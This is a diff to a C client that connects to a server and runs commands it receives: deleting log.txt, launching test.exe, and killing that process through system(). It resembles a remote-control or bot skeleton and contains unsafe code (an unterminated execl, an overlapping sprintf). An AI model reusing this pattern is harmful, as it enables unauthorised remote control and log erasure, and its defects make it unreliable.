@@ -13,10 +13,14 @@
 extern char ip_addr[16];
 extern int port;
 int sockfd;
-char recv_buf[1024] = {0};
+char recv_buf[CMD_BUF_LEN] = {0};
+char proc_buf[CMD_BUF_LEN] = {0};
+int child_pid;
 
 void    process_all(void);
+void    process_command(char* cmd);
 int     connect_server(void);
+int     create_process(const char* file, const char* argv);
 
 
 void process_all(void)
@@ -32,14 +36,72 @@ void process_all(void)
                 connect_state = ST_CONNECT;
             break;
         case ST_CONNECT:
-            recv(sockfd, recv_buf, 512, 0);
-            printf("recv: %s\n", recv_buf);
-            send(sockfd, "Hello!\r\n", strlen("Hello!\r\n") + 1, 0);
+            recv(sockfd, recv_buf, CMD_BUF_LEN, 0);
+            process_command(recv_buf);
             break;
         }/*switch(connect_state)*/
         sleep(5);
     }/*while(1)*/
 }
+
+
+void process_command(char* cmd)
+{
+    char file_cwd[MAX_FILEPATH] = { 0 };
+    getcwd(file_cwd, MAX_FILEPATH);
+    
+    if(cmd[0] != '@')
+    {
+        debug("Unknown command (%s) received!\n", cmd);
+        return;
+    }
+    switch(cmd[1])
+    {
+    case 'a':
+        send(sockfd, "Received a", strlen("Received a") + 1, 0);
+        system("rm log.txt -f");
+        break;
+    case 'A':
+        send(sockfd, "Received A", strlen("Received A") + 1, 0);
+        sprintf(file_cwd, "%s/test.exe", file_cwd);
+        child_pid = create_process(file_cwd, "test.exe");
+        break;
+    case 'b':
+        send(sockfd, "Received b", strlen("Received b") + 1, 0);
+        sprintf(proc_buf, "kill %d", child_pid);
+        printf("b: %s\n", proc_buf);
+        system(proc_buf);
+        break;
+    default:
+        send(sockfd, "Unknown command", strlen("Unknown command") + 1, 0);
+        debug("Unknown command (%s) received!\n", cmd);
+        break;
+    }
+}
+
+
+int   create_process(const char* file, const char* argv)
+{
+    int child;
+    if((child = fork()) == -1)
+    {
+        perror("fork process error\n");
+        exit(EXIT_FAILURE);
+    }
+    else if(child == 0)
+    {
+        if(execl(file, argv) == -1)
+        {
+            perror("execl error");
+            exit(EXIT_FAILURE);
+        }
+    }
+    else
+    {
+        return child;
+    }
+}
+
 
 
 int connect_server(void)
